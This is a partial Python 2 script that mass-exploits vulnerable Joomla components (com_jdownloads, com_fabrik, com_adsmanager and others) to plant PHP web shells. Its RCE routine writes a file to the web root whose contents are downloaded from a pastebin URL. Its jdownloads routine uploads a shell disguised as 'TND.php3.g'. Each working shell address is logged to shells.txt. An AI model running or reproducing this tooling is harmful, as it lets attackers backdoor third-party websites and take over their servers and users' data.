 ...
 |__   __(_)Sel3a    | |9wiya| |    |__   __|   
	...
	def com_rce(self,url):
		...
		try:
			...
			pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/TND.php','w+'),file_get_contents('https://pastebin.com/raw/m28eB2Ai'));")
			
			rce_url(url,pl)
			
			req_rce = requests.get(url+'/TND.php?tnd')
			
			if 'TND_Ye' in req_rce.content:
			
				print '{}[Target]: {} {}    ====> {}{} rce   {}{} eXploiting Done  '.format(sb, sd, url, fc,fc, sb,fg)
				open('shells.txt', 'a').write(url+'/TND.php?tnd'+'\n')
	...
	def com_jdownloads(self, url):
		...
		try:
			...
			filename1 = "TND.php3.g"
			
			
			com_jd_up = { 'file_upload':(filename1, shell_2, 'text/html'), 'pic_upload':(filename1, shell_2, 'text/html')}

			com_jd_dat = { 'name': 'yc-waif', 'mail': 'fou.mbk@gmail.com', 'catlist': '1', 'filetitle': "TND",
			...
			shell_jd = requests.get(url+'/images/jdownloads/screenshots/TND.php3.g?tnd')
		
			if 'TND' in shell_jd.content:
				
				print '{}[Target]: {} {}    ====> {}{} com_jdownloads   {}{} eXploiting Done  '.format(sb, sd, url, fc,fc, sb,fg)
				open('shells.txt', 'a').write(url+'/images/jdownloads/screenshots/TND.php3.g?tnd'+'\n')
	...
	def com_jbcatalog(self, url):
		...
		try:
			...
			if 'jQuery File' in check_jbcatalog.content:
				...
				if 'TND_Ye' in Shell_jbcatalog.content:
	...
	def com_fabrik(self, url):
		...
		try:
			...
			if 'filepath":' in check_fabrik.content:
				...
				if 'TND_Ye' in Shell_fabrik.content:			
	...
	def com_b2jcontact(self, url):
		...
		try:
			...
			if 'TND_Ye' in check_lib.content:			
	...
	def com_adsmanager(self, url):
		...
		try:
			...
			if '{"jsonrpc" : "2.0",' in check_adsm.content:
				...
				if 'TND_Ye' in check_shell.content:
